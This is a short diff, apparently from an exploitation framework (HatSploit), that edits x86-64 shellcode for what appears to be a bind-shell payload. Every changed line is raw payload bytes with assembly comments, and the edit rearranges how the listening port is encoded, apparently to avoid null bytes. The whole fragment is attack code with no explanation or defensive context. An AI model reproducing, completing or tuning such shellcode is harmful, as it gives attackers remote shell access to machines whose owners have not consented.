@@ -97,7 +97,8 @@ class HatSploitModule:
             b"\x48\x89\xc7" +                              # movq  %rax, %rdi
             b"\x48\x31\xf6" +                              # xorq  %rsi, %rsi
             b"\x56" +                                      # pushq  %rsi
-            b"\xbe" + bind_port +                          # movl  port, %esi
+            b"\xbe\x01\x02" +                              # movl  port, %esi
+            bind_port +                                    # port
             b"\x83\xee\x01" +                              # subl  $1, %esi
             b"\x56" +                                      # pushq  %rsi
             b"\x48\x89\xe6" +                              # movq  %rsp, %rsi
